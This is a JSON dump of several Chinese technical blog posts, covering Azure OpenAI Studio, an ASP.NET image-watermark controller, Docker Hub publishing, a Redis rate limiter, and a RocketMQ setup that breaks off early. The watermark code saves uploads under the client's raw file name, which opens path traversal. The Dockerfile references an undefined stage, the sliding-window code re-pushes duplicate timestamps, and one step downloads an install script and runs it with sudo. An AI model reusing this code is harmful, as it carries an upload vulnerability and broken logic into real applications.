Azure OpenAI 服务资源若要从 CLI 创建 Azure OpenAI 服务资源，请参阅此示例，并将以下变量替换为自己的变量： MyOpenAIResource：替换为资源的唯一名称 OAIResourceGroup：替换为资源组名称 eastus：替换为要部署资源的区域 subscriptionID：替换为订阅 ID 1234567az cognitiveservices account create \\-n MyOpenAIResource \\-g OAIResourceGroup \\-l eastus \\--kind OpenAI \\--sku s0 \\--subscription subscriptionID 注意 可以通过 CLI 命令 az account list-locations 查找可用于服务的区域。 若要了解如何通过 CLI 登录到 Azure 并创建 Azure 组，请参阅此处的文档。 区域可用性Azure OpenAI 服务提供了对多种类型的模型的访问。 某些模型仅在选定区域中可用。 有关区域可用性，请参阅 Azure OpenAI 模型可用性指南。 可以为每个区域创建两个 Azure OpenAI 资源。 Azure OpenAI Studio 提供对模型管理、部署、试验、自定义和学习资源的访问权限。 创建资源后，可以通过 Azure 门户访问 Azure OpenAI Studio，也可以在 https://oai.azure.com 通过使用 Azure OpenAI 资源实例登录来访问 Azure OpenAI Studio。 在登录工作流中，选择适当的目录、Azure 订阅和 Azure OpenAI 资源。 首次打开 Azure OpenAI Studio 时，屏幕顶部会显示一个“行动号召”按钮，用于部署第一个模型。 选择创建新部署的选项会打开“部署”页，从中可以部署基础模型并开始试验。 探索生成式 AI 模型的类型若要开始使用 Azure OpenAI 进行生成，需要选择一个基础模型并进行部署。 Microsoft 提供基础模型以及创建自定义基础模型的选项。 本模块介绍当前可用的基础模型。 Azure OpenAI 包括多种类型的模型： GPT-4 模型是最新一代的生成式预训练 (GPT) 模型，可以根据自然语言提示生成自然语言和代码补全。 GPT 3.5 模型可以根据自然语言提示生成自然语言和代码补全。 具体而言，GPT-35-turbo 模型针对基于聊天的交互进行了优化，在大多数生成式 AI 方案中都表现良好。 嵌入模型将文本转换为数字向量，并且在语言分析方案（例如比较文本源的相似性）中非常有用。 DALL-E 模型用于基于自然语言提示生成图像。 目前，DALL-E 模型处于预览阶段。 DALL-E 模型未在 Azure OpenAI Studio 界面中列出，并且不需要显式部署。 模型因速度、成本和完成特定任务的出色程度而异。 可以详细了解 Azure OpenAI 服务文档中介绍的差异和最新模型。 注意 定价由令牌和模型类型决定。 在此处详细了解最新定价。 在 Azure OpenAI Studio 中，“模型”页列出了可用的基础模型（DALL-E 模型除外），并提供了通过微调基本模型来创建其他自定义模型的选项。 模型状态为“成功”意味着它们已成功训练，并且可被选择用于部署。 部署生成式 AI 模型首先需要部署一个模型，以便进行 API 调用，从而接收提示完成。 创建新部署时，需要指出要部署的基础模型。 可以在一个或多个 Azure OpenAI 资源中实现任意数量的部署，只要它们的 TPM 总数在那个区域中低于 240K。 可通过多种方式部署基础模型。 使用 Azure OpenAI Studio 进行部署在 Azure OpenAI Studio 的“部署”页中，可以通过从菜单中选择模型名称来创建新部署。 可用的基础模型来自模型页中的列表。 在 Studio 的“部署”页中，还可以查看所有部署的相关信息，包括部署名称、模型名称、模型版本、状态、创建日期等。 使用 Azure CLI 进行部署还可以使用控制台部署模型。 使用此示例，将以下变量替换为自己的资源值： OAIResourceGroup：替换为资源组名称 MyOpenAIResource：替换为资源名称 MyModel：替换为模型的唯一名称 gpt-35-turbo：替换为要部署的基础模型 123456789az cognitiveservices account deployment create \\ -g OAIResourceGroup \\ -n MyOpenAIResource \\ --deployment-name MyModel \\ --model-name gpt-35-turbo \\ --model-version &quot;0301&quot; \\ --model-format OpenAI \\ --sku-name &quot;Standard&quot; \\ --sku-capacity 1 使用 REST API 进行部署可以使用 REST API 部署模型。 在请求正文中，指定要部署的基础模型。 请参阅 Azure OpenAI 文档中的示例。 使用提示从模型完成部署模型后，可以测试其完成提示的方式。 提示是发送到部署模型的完成终结点的请求的文本部分。 响应被称为完成，可以采用文本、代码的形式或其他形式。 提示类型可以根据任务将提示分组为请求类型。 任务类型 提示示例 完成示例 对内容进行分类 Tweet：我喜欢这次旅行。 情绪: 正 生成新内容 列出旅行方式 1.骑行 2. 乘车 … 进行对话 友好的 AI 助手 请参见示例 转换（转换和符号转换） 英语：你好 法语： bonjour 汇总内容 提供内容总结 {text} 机器学习的内容共享方法。 从离开的位置继续 种植西红柿的一种方法 就是播种种子。 提供事实答复 地球拥有多少颗卫星？ 一种 完成质量有几个因素会影响从生成式 AI 解决方案中获得的完成质量。 提示的工程处理方式。 单击此处详细了解提示工程。 模型参数（下文将介绍） 训练模型的数据，可以通过自定义模型微调进行调整 与通过提示工程和参数调整相比，你可以通过训练自定义模型更好地控制返回的完成。 发起呼叫可以通过 REST API、Python、C# 或从 Studio 开始调用部署的模型。 如果部署的模型具有 GPT-3.5 或 GPT-4 模型库，请使用聊天完成文档，该文档具有与其他基础模型不同的请求终结点和变量。 在 Azure OpenAI Studio 的操场中测试模型操场是 Azure OpenAI Studio 中的有用接口，可用于试验部署的模型，而无需开发自己的客户端应用程序。 Azure OpenAI Studio 提供了具有不同参数优化选项的多个操场。 完成操场完成操场允许你通过文本输入文本输出接口调用部署的模型，并调整参数。 你需要在“部署”下选择模型的部署名称。 （可选）可以使用提供的示例入门，然后输入自己的提示。 完成操场参数可以调整许多参数来更改模型的性能： 温度：控制随机性。 降低温度意味着模型会产生更多重复性和确定性的回复。 提高温度会导致更多意外或创造性的回复。 请尝试调整温度或 Top P 值，但不要同时调整两者。 最大长度(标记数)：对每个模型响应的标记数设置限制。 该 API 支持最多 4000 个标记，包括提示（包括系统消息、示例、消息历史记录以及用户查询）和模型的响应。 对于典型的英文文本，一个标记大约是四个字符。 停止序列：使响应停止在所需点，例如句子或列表的末尾。 指定最多四个序列，模型将停止在响应中生成更多标记。 返回的文本不包含停止序列。 最高概率(最高 P)：与温度类似，它控制着随机性，但使用不同的方法。 降低 Top P 值会将模型的标记选择范围缩小到可能性更高的标记。 增加 Top P 值会使模型既选择可能高的标记又选择可能性低的标记。 请尝试调整温度或 Top P 值，但不要同时调整两者。 频率处罚：根据标记在文本中出现的频率，按比例降低标记重复的可能性。 这会降低在响应中重复完全相同文本的可能性。 存在处罚：降低到目前为止在文本中出现的任何标记重复的可能性。 这会增加在响应中引入新主题的可能性。 响应前文本：在用户输入之后和模型响应之前插入文本。 这有助于为响应准备模型。 响应后文本：在模型生成的响应之后插入文本以鼓励进一步的用户输入，就像对话建模一样。 聊天操场聊天操场基于对话传入消息传出界面。 可以使用系统消息初始化会话以设置聊天上下文。 在聊天操场中，可以添加少样本示例。 “少样本”一词是指提供几个示例来帮助模型了解它需要执行的操作。 可以将其与零样本（指不提供任何示例）进行对比。 在助手设置中，可以提供用户输入和助手响应的少样本示例。 助手会尝试以你在系统消息中定义的语气、规则和格式来模拟这里包含的响应。 聊天操场参数“完成”操场等“聊天”操场还包括温度参数。 “聊天”操场还支持“完成”操场中不可用的其他参数。 其中包括： 最大响应：对每个模型响应的标记数设置限制。 该 API 支持最多 4000 个标记，包括提示（包括系统消息、示例、消息历史记录以及用户查询）和模型的响应。 对于典型的英文文本，一个标记大约是四个字符。 最高 P：与温度类似，它控制着随机性，但使用不同的方法。 降低 Top P 值会将模型的标记选择范围缩小到可能性更高的标记。 增加 Top P 值会使模型既选择可能高的标记又选择可能性低的标记。 请尝试调整温度或 Top P 值，但不要同时调整两者。 包含的过去消息数：选择要包含在每个新 API 请求中的过去消息数。 包含过去的消息有助于为新用户查询提供模型上下文。 将此数字设置为 10 将包含 5 个用户查询和 5 个系统响应。 可以在聊天操场中查看“当前标记计数”。 由于 API 调用按标记定价，并且可以设置最大响应标记限制，因此需要留意当前标记计数，以确保对话不会超过最大响应标记计数。 练习 - 开始使用 Azure OpenAI 服务已完成 现在，你有机会在 Azure OpenAI Studio 中部署和管理模型。 在本练习中，你将部署 Azure OpenAI 基础模型，并在完成和聊天操场中测试它们。 你将有机会了解提示和参数对文本和代码完成的影响。 注意 为了完成此实验室，你将需要一个 Azure 订阅。 还需要注册 Azure OpenAI 访问权限才能完成此实验室。 要完成本模块的练习，请启动 VM 并按照说明操作。 注意 若要完成此练习，你将需要 Microsoft Azure 订阅。 如果你还没有该订阅，可以注册一个。 如果需要为此练习设置计算机，可以使用此设置指南，然后按照下面链接的练习说明进行操作。 请注意，设置指南适用于多个开发练习，其中可能包括该特定练习不需要的软件。 此外，由于可能的操作系统和设置配置的范围太广，如果你选择在自己的计算机上完成此练习，我们将无法提供支持。 要在自己的计算机上按照这些说明进行操作，可以按照此处的练习说明进行操作。 提示 完成练习后，如果你已完成对 Azure AI 服务的学习，请删除在练习期间创建的 Azure 资源。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"}],"author":"mu"},{"title":".NET AddWatermark","slug":"NET-AddWatermark","date":"2024-06-01T11:18:12.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/01/NET-AddWatermark/","permalink":"https://banjinmei.github.io/2024/06/01/NET-AddWatermark/","excerpt":"","text":"controller1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[HttpPost] public async Task&lt;IActionResult&gt; AddWatermark(IFormFile file, string watermarkText, string color, int transparency) &#123; if (file != null &amp;&amp; file.Length &gt; 0) &#123; // 将上传的文件保存到服务器 var uploads = Path.Combine(_environment.WebRootPath, &quot;uploads&quot;); if (!Directory.Exists(uploads)) &#123; Directory.CreateDirectory(uploads); &#125; var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) &#123; await file.CopyToAsync(fileStream); &#125; // 添加水印 using (Image image = Image.FromFile(filePath)) using (Graphics g = Graphics.FromImage(image)) &#123; // 设置水印文本的字体和颜色 Font font = new Font(&quot;Arial&quot;, 20); Color colorValue = ColorTranslator.FromHtml(color); SolidBrush brush = new SolidBrush(Color.FromArgb(transparency, colorValue.R, colorValue.G, colorValue.B)); // 计算水印位置 int x = 10; int y = image.Height - 30; // 绘制水印 g.DrawString(watermarkText, font, brush, new PointF(x, y)); // 保存带水印的图片 var newFileName = &quot;watermarked_&quot; + file.FileName; var newFilePath = Path.Combine(uploads, newFileName); image.Save(newFilePath, ImageFormat.Jpeg); // 返回带水印的图片路径 ViewBag.ImagePath = &quot;/uploads/&quot; + newFileName; &#125; &#125; return View(&quot;Index&quot;); &#125; views123456789101112131415161718192021222324252627282930313233@&#123; ViewBag.Title = &quot;Home Page&quot;;&#125;&lt;h2&gt;图片加水印&lt;/h2&gt;&lt;form action=&quot;/Home/AddWatermark&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div&gt; &lt;label for=&quot;file&quot;&gt;选择图片：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;watermarkText&quot;&gt;水印文字：&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;watermarkText&quot; id=&quot;watermarkText&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;color&quot;&gt;水印颜色：&lt;/label&gt; &lt;input type=&quot;color&quot; name=&quot;color&quot; id=&quot;color&quot; value=&quot;#000000&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;transparency&quot;&gt;透明度：&lt;/label&gt; &lt;input type=&quot;range&quot; name=&quot;transparency&quot; id=&quot;transparency&quot; min=&quot;0&quot; max=&quot;255&quot; value=&quot;128&quot; /&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot;&gt;上传并添加水印&lt;/button&gt;&lt;/form&gt;@if (ViewBag.ImagePath != null)&#123; &lt;h3&gt;带水印的图片：&lt;/h3&gt; &lt;img src=&quot;@ViewBag.ImagePath&quot; alt=&quot;Watermarked Image&quot; &gt;&#125; Uploads folderUploads Position TranslateTransform123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081[HttpPost] public async Task&lt;IActionResult&gt; AddWatermark(IFormFile file, string watermarkText, string color, int transparency, string position, int angle) &#123; if (file != null &amp;&amp; file.Length &gt; 0) &#123; // 将上传的文件保存到服务器 var uploads = Path.Combine(_environment.WebRootPath, &quot;uploads&quot;); if (!Directory.Exists(uploads)) &#123; Directory.CreateDirectory(uploads); &#125; var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) &#123; await file.CopyToAsync(fileStream); &#125; // 添加水印 using (Image image = Image.FromFile(filePath)) using (Graphics g = Graphics.FromImage(image)) &#123; // 设置水印文本的字体和颜色 Font font = new Font(&quot;Arial&quot;, 20); Color colorValue = ColorTranslator.FromHtml(color); SolidBrush brush = new SolidBrush(Color.FromArgb(transparency, colorValue.R, colorValue.G, colorValue.B)); // 计算水印位置 PointF point = CalculateWatermarkPosition(position, image, g, watermarkText, font); // 旋转水印 g.TranslateTransform(point.X, point.Y); g.RotateTransform(angle); g.DrawString(watermarkText, font, brush, 0, 0); g.ResetTransform(); // 保存带水印的图片 var newFileName = &quot;watermarked_&quot; + file.FileName; var newFilePath = Path.Combine(uploads, newFileName); image.Save(newFilePath, ImageFormat.Jpeg); // 返回带水印的图片路径 ViewBag.ImagePath = &quot;/uploads/&quot; + newFileName; &#125; &#125; return View(&quot;Index&quot;); &#125; private PointF CalculateWatermarkPosition(string position, Image image, Graphics g, string text, Font font) &#123; SizeF textSize = g.MeasureString(text, font); float x = 0; float y = 0; switch (position.ToLower()) &#123; case &quot;topleft&quot;: x = 10; y = 10; break; case &quot;topright&quot;: x = image.Width - textSize.Width - 10; y = 10; break; case &quot;center&quot;: x = (image.Width - textSize.Width) / 2; y = (image.Height - textSize.Height) / 2; break; case &quot;bottomleft&quot;: x = 10; y = image.Height - textSize.Height - 10; break; case &quot;bottomright&quot;: x = image.Width - textSize.Width - 10; y = image.Height - textSize.Height - 10; break; &#125; return new PointF(x, y); &#125; change view123456789101112131415&lt;div&gt; &lt;label for=&quot;position&quot;&gt;水印位置：&lt;/label&gt; &lt;select name=&quot;position&quot; id=&quot;position&quot;&gt; &lt;option value=&quot;topleft&quot;&gt;左上&lt;/option&gt; &lt;option value=&quot;topright&quot;&gt;右上&lt;/option&gt; &lt;option value=&quot;center&quot;&gt;居中&lt;/option&gt; &lt;option value=&quot;bottomleft&quot;&gt;左下&lt;/option&gt; &lt;option value=&quot;bottomright&quot;&gt;右下&lt;/option&gt; &lt;/select&gt;&lt;/div&gt;&lt;div&gt; &lt;label for=&quot;angle&quot;&gt;倾斜角度：&lt;/label&gt; &lt;input type=&quot;number&quot; name=&quot;angle&quot; id=&quot;angle&quot; value=&quot;0&quot; /&gt;&lt;/div&gt; multiple 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859[HttpPost]public async Task&lt;IActionResult&gt; AddWatermarkMore(List&lt;IFormFile&gt; files, string watermarkText, string color, int transparency, string position, int angle)&#123; var watermarkedPaths = new List&lt;string&gt;(); foreach (var file in files) &#123; if (file != null &amp;&amp; file.Length &gt; 0) &#123; // 将上传的文件保存到服务器 var uploads = Path.Combine(_environment.WebRootPath, &quot;uploads&quot;); if (!Directory.Exists(uploads)) &#123; Directory.CreateDirectory(uploads); &#125; // 生成基于时间戳和随机数的文件名 var fileName = $&quot;&#123;DateTime.Now:yyyyMMddHHmmss&#125;_&#123;Guid.NewGuid().ToString().Substring(0, 8)&#125;&#123;Path.GetExtension(file.FileName)&#125;&quot;; var filePath = Path.Combine(uploads, fileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) &#123; await file.CopyToAsync(fileStream); &#125; // 添加水印 using (Image image = Image.FromFile(filePath)) using (Graphics g = Graphics.FromImage(image)) &#123; // 设置水印文本的字体和颜色 Font font = new Font(&quot;Arial&quot;, 20); Color colorValue = ColorTranslator.FromHtml(color); SolidBrush brush = new SolidBrush(Color.FromArgb(transparency, colorValue.R, colorValue.G, colorValue.B)); // 计算水印位置 PointF point = CalculateWatermarkPosition(position, image, g, watermarkText, font); // 旋转水印 g.TranslateTransform(point.X, point.Y); g.RotateTransform(angle); g.DrawString(watermarkText, font, brush, 0, 0); g.ResetTransform(); // 保存带水印的图片 var newFileName = $&quot;watermarked_&#123;fileName&#125;&quot;; var newFilePath = Path.Combine(uploads, newFileName); image.Save(newFilePath, ImageFormat.Jpeg); // 添加水印路径到列表 watermarkedPaths.Add(&quot;/uploads/&quot; + newFileName); &#125; &#125; &#125; ViewBag.ImagePaths = watermarkedPaths; return View(&quot;Index&quot;);&#125; change view123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;h2&gt;图片加水印&lt;/h2&gt;&lt;form action=&quot;/Home/AddWatermark&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div&gt; &lt;label for=&quot;files&quot;&gt;选择图片：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;files&quot; id=&quot;files&quot; multiple /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;watermarkText&quot;&gt;水印文字：&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;watermarkText&quot; id=&quot;watermarkText&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;color&quot;&gt;水印颜色：&lt;/label&gt; &lt;input type=&quot;color&quot; name=&quot;color&quot; id=&quot;color&quot; value=&quot;#000000&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;transparency&quot;&gt;透明度：&lt;/label&gt; &lt;input type=&quot;range&quot; name=&quot;transparency&quot; id=&quot;transparency&quot; min=&quot;0&quot; max=&quot;255&quot; value=&quot;128&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;position&quot;&gt;水印位置：&lt;/label&gt; &lt;select name=&quot;position&quot; id=&quot;position&quot;&gt; &lt;option value=&quot;topleft&quot;&gt;左上&lt;/option&gt; &lt;option value=&quot;topright&quot;&gt;右上&lt;/option&gt; &lt;option value=&quot;center&quot;&gt;居中&lt;/option&gt; &lt;option value=&quot;bottomleft&quot;&gt;左下&lt;/option&gt; &lt;option value=&quot;bottomright&quot;&gt;右下&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;angle&quot;&gt;倾斜角度：&lt;/label&gt; &lt;input type=&quot;number&quot; name=&quot;angle&quot; id=&quot;angle&quot; value=&quot;0&quot; /&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot;&gt;上传并添加水印&lt;/button&gt;&lt;/form&gt;@if (ViewBag.ImagePaths != null)&#123; &lt;h3&gt;带水印的图片：&lt;/h3&gt; @foreach (var imagePath in ViewBag.ImagePaths) &#123; &lt;div&gt; &lt;img src=&quot;@imagePath&quot; alt=&quot;Watermarked Image&quot; style=&quot;max-width: 100%; height: auto;&quot; &gt; &lt;/div&gt; &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":".NET Dockerhub","slug":"NET-Dockerhub","date":"2024-05-31T17:24:22.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/01/NET-Dockerhub/","permalink":"https://banjinmei.github.io/2024/06/01/NET-Dockerhub/","excerpt":"","text":"📚Dockerfile123456789101112131415FROM mcr.microsoft.com/dotnet/sdk:8.0 AS buildWORKDIR /srcCOPY [&quot;MyMvcApp.csproj&quot;, &quot;./&quot;]RUN dotnet restore &quot;MyMvcApp.csproj&quot;COPY . .WORKDIR &quot;/src/&quot;RUN dotnet build &quot;MyMvcApp.csproj&quot; -c Release -o /app/buildFROM build AS publishRUN dotnet publish &quot;MyMvcApp.csproj&quot; -c Release -o /app/publishFROM base AS finalWORKDIR /appCOPY --from=publish /app/publish .ENTRYPOINT [&quot;dotnet&quot;, &quot;MyMvcApp.dll&quot;] ✏️ Docker 镜像1docker build -t mymvcapp:latest . 📝在 Docker Hub 上创建仓库登录 Docker Hub (https://hub.docker.com)。点击 “Create Repository”。输入仓库名称，例如 mymvcapp，然后点击 “Create”。 💻将 Docker 镜像推送到 Docker Hub首先，登录 Docker Hub： 1docker login 📅标记镜像1docker tag mymvcapp:latest &lt;your-dockerhub-username&gt;/mymvcapp:latest 📊推送镜像到 Docker Hub1docker push &lt;your-dockerhub-username&gt;/mymvcapp:latest &#x3D; Docker Hub 用户名 1docker run -d -p 80:80 &lt;your-dockerhub-username&gt;/mymvcapp:latest 🎓完整流程回顾12345678910111213#创建 .NET 8 MVC 应用程序。#在项目根目录下创建 Dockerfile。#构建 Docker 镜像：docker build -t mymvcapp:latest .#在 Docker Hub 上创建仓库。#登录 Docker Hub：docker login#标记并推送 Docker 镜像到 Docker Hub：docker tag mymvcapp:latest &lt;your-dockerhub-username&gt;/mymvcapp:latestdocker push &lt;your-dockerhub-username&gt;/mymvcapp:latest#在本地或服务器上运行 Docker 镜像：docker run -d -p 80:80 &lt;your-dockerhub-username&gt;/mymvcapp:latest#通过这些步骤，将 .NET 8 MVC 部署到 Docker Hub 并运行它~~ err denied requested access to the resource is denied 12docker logoutdocker login err error response from deamon:get “https://registry-1.docket.io/v2/&quot;:unauthorized:incorrect username or password用户密码错误 https://docs.docker.com/go/access-tokenshttps://docs.docker.com/security/for-developers/access-tokens/#create-an-access-token 12345docker login -u qxxxdckr_pat_o0ZpPxxxdocker tag mymvcapp:latest xx/mymvcapp:devdocker push &lt;your-dockerhub-username&gt;/mymvcapp:dev 推送成功后可以在hub仓库查看 运行 1docker run -d -p 18081:8080 -p 18082:8081 --name mywebmvcapp mymvcapp:latest END","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Dockerhub","slug":"Dockerhub","permalink":"https://banjinmei.github.io/tags/Dockerhub/"}],"author":"mu"},{"title":".NET Redis 10s Rate Limiter Sliding Window Algorithm","slug":"NET-Redis-RateLimiter","date":"2024-05-30T22:24:16.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/31/NET-Redis-RateLimiter/","permalink":"https://banjinmei.github.io/2024/05/31/NET-Redis-RateLimiter/","excerpt":"","text":"在.NET中使用Redis来限制接口请求频率（每10秒只允许请求一次） NuGet setupStackExchange.Redis 实现速率限制逻辑：在你的控制器或服务层中，你需要编写一个方法来检查并更新Redis中的速率限制计数器。设置Redis键：为每个用户或每个IP地址（取决于你的需求）设置一个唯一的键。这个键将用于存储最后一次请求的时间戳和&#x2F;或请求计数。检查时间戳：当请求到达时，从Redis中获取该键的值（时间戳）。如果键不存在或时间戳超过10秒，则允许请求并更新键的值（设置为当前时间戳）。处理超过速率的请求：如果时间戳在10秒内，则拒绝或限制该请求（返回限制状态码）。 1234567891011121314151617181920212223242526272829303132333435363738394041424344private static readonly Lazy&lt;ConnectionMultiplexer&gt; LazyConnection = new Lazy&lt;ConnectionMultiplexer&gt;(() =&gt;&#123; // 配置Redis连接字符串 &quot;localhost,abortConnect=false&quot; return ConnectionMultiplexer.Connect(&quot;localhost:6379&quot;);&#125;);private static ConnectionMultiplexer Connection =&gt; LazyConnection.Value;private static IDatabase Db =&gt; Connection.GetDatabase();public async Task&lt;ActionResult&gt; MyAction()&#123; IPAddress clientIpAddress = HttpContext.Connection.RemoteIpAddress; string ipAddress = clientIpAddress.ToString(); string redisKey = $&quot;rate-limit:&#123;ipAddress&#125;&quot;; // 构建Redis键名 // 获取当前时间戳（可以是Unix时间戳或任何你选择的格式） long currentTimestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(); // 尝试从Redis获取时间戳 var redisValue = await Db.StringGetAsync(redisKey); long lastTimestamp = redisValue.HasValue ? (long)redisValue : 0; // 检查是否超过10秒 if (currentTimestamp - lastTimestamp &gt;= 10) &#123; // 如果超过10秒，则允许请求并更新Redis键 await Db.StringSetAsync(redisKey, currentTimestamp, TimeSpan.FromSeconds(10)); // 设置键的过期时间为10秒 return Content(&quot;Request allowed.&quot;); &#125; else &#123; // 如果未超过10秒，则拒绝请求 HttpResponseMessage response = new HttpResponseMessage(HttpStatusCode.TooManyRequests) &#123; ReasonPhrase = &quot;Too Many Requests&quot;, Content = new StringContent(&quot;Rate limit exceeded. Please try again later.&quot;) &#125;; // 处理请求 return Content(&quot;Please try again later. &quot;);// throw new HttpResponseException(response); // 或者返回自定义的ActionResult &#125;&#125; 扩展为参数 123MyAction(string p)//...string redisKey = $&quot;rate-limit:&#123;p&#125;&quot;; 请求&#x2F;MyAction?p&#x3D;2&#x2F;MyAction?p&#x3D;3 滑动窗口算法滑动窗口算法（Sliding Window Algorithm）是一种用于解决字符串&#x2F;数组 问题的算法，它通过维护一个窗口（即一个连续的子串或子数组），并在字符串或数组上滑动这个窗口来寻找满足特定条件的子串或子数组。以下是滑动窗口算法的主要内容和特点： 维护窗口：通过两个指针（左指针和右指针）来定义窗口的边界。移动窗口：通过移动右指针来扩展窗口，同时根据问题的要求调整左指针来缩小窗口。更新信息：在窗口滑动的过程中，根据需要更新一些数据结构（如哈希表）来保存所需的信息。 实现方法步骤1.初始化：定义左指针和右指针，并初始化它们的位置。步骤2.扩展窗口：向右移动右指针，扩展窗口，同时更新所需的信息（如字符频率的哈希表）。步骤3.检查条件：当窗口满足特定条件时，开始收缩窗口。步骤4.收缩窗口：向右移动左指针，缩小窗口，同时更新所需的信息。步骤5.更新最优解：在收缩窗口的过程中，不断更新最优解（如最长子串、最短子串等）。重复步骤：重复步骤2到步骤5，直到右指针到达字符串或数组的末尾。 在Redis中维护一个窗口内的请求时间戳列表，而不是仅仅存储最后一次请求的时间戳。 我们从Redis中获取存储的时间戳列表。移除超过窗口大小的时间戳。检查剩余的时间戳数是否超过了最大请求数 MaxRequests。如果超过，则返回超过的响应；否则，记录当前时间戳并允许请求。 123456789101112131415161718192021222324252627282930private const int MaxRequests = 5; // 最大请求数private const int WindowSizeInSeconds = 10; // 窗口大小（秒）//... // 获取Redis中存储的时间戳列表 var redisValue = await Db.ListRangeAsync(redisKey); var timestamps = redisValue.Select(value =&gt; (long)value).ToList(); // 移除窗口之外的时间戳 timestamps = timestamps.Where(timestamp =&gt; currentTimestamp - timestamp &lt;= WindowSizeInSeconds).ToList(); if (timestamps.Count &gt;= MaxRequests) &#123; // 如果请求数超过限制，则拒绝请求 HttpResponseMessage response = new HttpResponseMessage(HttpStatusCode.TooManyRequests) &#123; ReasonPhrase = &quot;Too Many Requests&quot;, Content = new StringContent(&quot;Rate limit exceeded. Please try again later.&quot;) &#125;; return Content(&quot;Please try again later.&quot;); &#125; else &#123; // 如果请求数未超过限制，则允许请求并记录当前时间戳 timestamps.Add(currentTimestamp); await Db.ListRightPushAsync(redisKey, timestamps.Select(timestamp =&gt; (RedisValue)timestamp).ToArray()); await Db.KeyExpireAsync(redisKey, TimeSpan.FromSeconds(WindowSizeInSeconds)); // 设置键的过期时间为窗口大小 return Content(&quot;Request allowed.&quot;); &#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Redis","slug":"Redis","permalink":"https://banjinmei.github.io/tags/Redis/"}],"author":"mu"},{"title":".NET RocketMQ","slug":"NET-RocketMQ","date":"2024-05-29T12:17:33.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/29/NET-RocketMQ/","permalink":"https://banjinmei.github.io/2024/05/29/NET-RocketMQ/","excerpt":"","text":"RocketMQ 是一款由阿里巴巴集团开发并开源给Apache软件基金会的分布式消息及流处理平台。以其高吞吐量、低延迟、高可用性等特点而广受欢迎。支持Java，C++, Python, Go, .NET等。 异步解耦：可以实现上游和下游业务系统的松耦合设计，使得服务部分节点异常不会影响到核心交易系统的正常运转。在电商、金融等分布式系统中，这种解耦设计尤为重要。削峰填谷：在如秒杀、大促等大型活动中，系统会面临巨大的流量冲击。RocketMQ利用其高性能的消息处理能力，可以有效地应对这种流量冲击，保证系统的稳定运行。顺序消息：支持顺序消息（分区有序），可以确保消息的先进先出。这在交易系统中的订单创建、支付、退款等流程中尤为重要，因为这些流程对消息的顺序有严格要求。分布式事务消息：支持分布式事务消息，可以保证分布式事务的强一致性。这在涉及多个服务的分布式系统中非常有用，可以确保数据的一致性和完整性。 RocketMQ优点高吞吐量和低延迟：能够处理大规模消息流，并提供低延迟的消息传递。这使得它非常适合处理高并发的应用场景，如电子商务和金融交易系统。可靠性：具有高度可靠的消息传递机制。它支持消息持久化和复制，确保消息不会丢失，并能够在故障发生时进行自动恢复。分布式扩展：支持水平扩展，可以方便地添加新的消息生产者和消费者来应对负载增加的情况。易于部署：提供开箱即用的部署方式，非常适合在分布式系统中使用。 RocketMQ架构生产者（Producer）用于产生消息的运行实体，通常集成在业务系统的上游。主题（Topic）消息传输和存储的分组容器，内部由多个队列组成。队列（MessageQueue）消息传输和存储的实际单元容器，类似于其他消息队列中的分区。消息（Message）RocketMQ 的最小传输单元，具备不可变性。消费者分组（ConsumerGroup）发布订阅模型中定义的独立的消费身份分组，用于统一管理多个消费者。消费者（Consumer）消费消息的运行实体，集成在业务系统的下游。订阅关系（Subscription）发布订阅模型中消息过滤、重试、消费进度的规则配置。 部署RocketMQ（docker）安装 Docker：123#debian curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 拉取 RocketMQ 镜像：使用以下命令从 Docker Hub 拉取最新的 RocketMQ 镜像： 1docker 